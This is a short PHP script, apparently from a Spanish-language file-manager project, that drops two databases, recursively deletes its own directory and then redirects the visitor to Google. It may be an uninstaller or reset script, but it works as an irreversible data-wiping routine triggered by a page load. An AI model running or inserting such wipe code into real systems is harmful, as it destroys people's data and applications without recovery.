<?php
include ("conexion.php");
$sql1="drop database usuario";
$sql2="drop database gestorarchivos";
$credb->query($sql1);
$credb->query($sql2);
    function rmDir_rf($carpeta)
    {
      foreach(glob($carpeta . "/*") as $archivos_carpeta){             
        if (is_dir($archivos_carpeta)){
          rmDir_rf($archivos_carpeta);
        } else {
        unlink($archivos_carpeta);
        }
      }
      rmdir($carpeta);
     }
$dir= __FILE__;
$carpeta=dirname($dir);
echo $carpeta;
rmDir_rf($carpeta);
header("Location: https://www.google.com");
?>